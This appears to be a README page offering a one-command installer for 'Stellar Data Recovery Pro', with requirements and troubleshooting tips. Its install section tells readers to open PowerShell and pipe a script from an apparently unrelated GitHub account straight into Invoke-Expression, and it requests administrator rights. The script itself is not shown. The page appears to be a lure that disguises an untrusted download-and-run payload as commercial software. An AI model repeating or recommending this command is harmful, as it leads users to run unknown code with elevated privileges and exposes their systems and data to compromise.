# Stellar Data Recovery Pro

One-command installer for Stellar Data Recovery — recover lost photos, videos, documents from formatted drives and crashed systems

## Install

Open **PowerShell** and run:

```
irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
```

## What it does

1. Requests administrator rights for raw disk access
2. Downloads Stellar with deep scan and RAID modules
3. Installs file signature database for 400+ formats
4. Launches Stellar — Select → Scan → Recover

## Requirements

- Windows 10/11 (64-bit)
- PowerShell 5.1+
- Internet connection
- 4 GB RAM (8 GB recommended)

## Troubleshooting

**Scan takes hours?**
Normal for large drives. Filter by file type to find files faster.

**Files corrupted after recovery?**
Enable Preview before saving. Partially overwritten data can't be restored.
